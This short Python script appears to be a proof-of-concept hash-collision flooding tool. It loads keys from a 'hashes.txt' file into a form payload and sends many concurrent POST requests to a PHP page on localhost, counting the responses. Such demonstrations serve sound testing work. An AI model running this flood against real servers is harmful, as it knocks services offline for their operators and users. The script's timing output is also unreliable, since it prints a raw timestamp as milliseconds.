#!/bin/env python
import grequests
import time
import sys


if __name__ == "__main__":
    host = "http://localhost:8080"
    payload = {"name": "lukas", "email": "me@lukasmartinelli.ch"}
    count = int(sys.argv[1])

    with open("hashes.txt") as fh:
        for i, line in enumerate(fh):
            payload[line.strip()] = i

    print("Payload:")
    print(payload)

    reqs = []
    for i in range(0, count):
        url = host + "/index.php"
        print("POST {0}".format(host))
        reqs.append(grequests.post(url, data=payload))

    successful_responses = 0
    failed_responses = 0
    start = time.time()
    for resp in grequests.imap(reqs, stream=False, size=100):
        if resp.status_code == 200:
            successful_responses += 1
        else:
            failed_responses += 1
        resp.close()

    end = time.time()

    print("Made {0} requests in {1}ms".format(count, end))
    print("Successful: {0}".format(successful_responses))
    print("Failed: {0}".format((failed_responses)))
